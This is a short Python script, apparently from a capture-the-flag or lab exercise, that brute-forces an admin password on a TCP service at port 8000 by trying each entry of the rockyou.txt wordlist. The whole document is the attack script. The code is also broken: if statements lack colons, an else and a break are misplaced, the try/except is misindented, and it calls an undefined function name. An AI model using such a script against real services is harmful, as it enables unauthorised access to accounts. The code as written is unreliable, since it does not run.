import socket
import os

host = os.environ.get('ip')
if not host:
    print("Error: Environment variable 'ip' is not set")
    exit(1)

port = 8000

wordlist = "/usr/share/wordlists/rockyou.txt"

def fuzz_endpoint(wordlist):
    unique_responses = set()  # Use a set to store unique responses
    try:
        with open(wordlist, 'r') as file:
            for password in file:
              # Clean up lines
                password = password.strip()
              # Establish connection in server
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, port))
                  # Send "admin" cmd to prompt for password
                    s.sendall(b'admin\n')
                  # Recieve the password prompt
                    response = s.recv(1024).decode().strip()
                    if "password" in response.lower()
                        s.sendall((password + '\n').encode())
                        # Receive the response after entering the password
                        response = s.recv(1024).decode().strip()

                        # Check is the password is correct
                        if "password:" in response.lower()
                            continue
                        else:
                          print(f'The password is: {password}')
                          break
    else:
      print("Password not recieved")
      break
    
    except FileNotFoundError:
        print(f"Password not found.")
    except Exception as e:
        print(f"Error has occurred: {e}")

fuzz_password(wordlist)
